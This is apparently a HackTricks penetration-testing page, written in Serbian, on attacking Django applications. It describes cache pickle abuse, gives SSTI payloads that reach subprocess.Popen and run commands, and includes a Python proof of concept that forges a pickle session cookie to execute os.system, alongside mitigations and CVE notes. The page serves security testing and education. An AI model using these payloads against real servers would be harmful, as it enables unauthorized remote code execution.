# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Podrazumevani način čuvanja cache-a u Django-u je [Python pickles](https://docs.python.org/3/library/pickle.html), što može dovesti do RCE ako se [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **Ako napadač može dobiti pristup za upis u cache, može eskalirati ovu ranjivost u RCE na osnovnom serveru**.

Django cache se čuva na jednom od četiri mesta: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), ili u [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache koji se čuva u Redis serveru ili bazi podataka predstavlja najverovatnije vektore napada (Redis injection i SQL injection), ali napadač takođe može iskoristiti file-based cache da pretvori proizvoljni upis u RCE. Održavaoci su ovo označili kao non-issue. Važno je napomenuti da će folder sa cache fajlovima, ime SQL tabele i detalji Redis servera varirati u zavisnosti od implementacije.

Ovaj HackerOne izveštaj daje odličan, ponovljiv primer iskorišćavanja Django cache-a koji se čuva u SQLite bazi: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Django Template Language (DTL) je **Turing-complete**. Ako se podaci koje korisnik prosledi renderuju kao *template string* (na primer pozivom `Template(user_input).render()` ili kada `|safe`/`format_html()` ukloni automatsko escapovanje), napadač može postići potpun SSTI → RCE.

### Detection
1. Tražite dinamičke pozive `Template()` / `Engine.from_string()` / `render_to_string()` koji uključuju *bilo koji* nesanitizovani podatak iz zahteva.
2. Pošaljite time-based ili arithmetic payload:
```django
{{7*7}}
```
Ako renderovani izlaz sadrži `49`, ulaz je kompajliran od strane template engine-a.

### Primitiv za RCE
Django blokira direktan pristup `__import__`, ali Python graf objekata je dostupan:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Pronađite indeks `subprocess.Popen` (≈400–500 u zavisnosti od Python builda) i izvršite proizvoljne komande:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Sigurniji univerzalni gadget je iterirati dok `cls.__name__ == 'Popen'`.

Isti gadget radi za **Debug Toolbar** ili **Django-CMS** template rendering funkcije koje neispravno rukovode korisničkim unosom.

---

### Takođe vidi: ReportLab/xhtml2pdf PDF export RCE
Aplikacije izgrađene na Django često integrišu xhtml2pdf/ReportLab za izvoz prikaza u PDF. Kada HTML pod kontrolom korisnika dospe u generisanje PDF-a, rl_safe_eval može evaluirati izraze unutar trostrukih zagrada `[[[ ... ]]]`, omogućavajući izvršavanje koda (CVE-2023-33733). Detalji, payloads i mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
Ako je podešavanje `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` omogućeno (ili custom serializer koji deserializuje pickle), Django *decrypts and unpickles* session cookie **pre** pozivanja bilo kog view koda. Dakle, posedovanje važećeg signing key-a (projekat `SECRET_KEY` po defaultu) je dovoljno za trenutnu remote code execution.

### Exploit Requirements
* Server koristi `PickleSerializer`.
* Napadač zna / može pogoditi `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Pošaljite dobijeni cookie — payload se izvršava sa privilegijama WSGI workera.

**Mitigations**: Zadržite podrazumevani `JSONSerializer`, rotirajte `SECRET_KEY` i konfigurišite `SESSION_COOKIE_HTTPONLY`.

---

## Nedavni (2023-2025) CVE-ovi za Django visokog uticaja koje Pentesters treba da provere
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (ispravljeno 4. jun 2025). Omogućava napadačima da ubace newlines/ANSI kodove u log fajlove i zagade naknadnu analizu logova. Nivo zakrpe ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Kreiranjem JSON ključeva moguće je prekinuti citiranje i izvršiti proizvoljan SQL. Ispravljeno u verzijama 4.2.15 / 5.0.8.

Uvek identifikujte tačnu verziju framework-a pomoću stranice greške za `X-Frame-Options` ili hasha `/static/admin/css/base.css` i testirajte gore navedeno gde je primenljivo.

---

## Reference
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
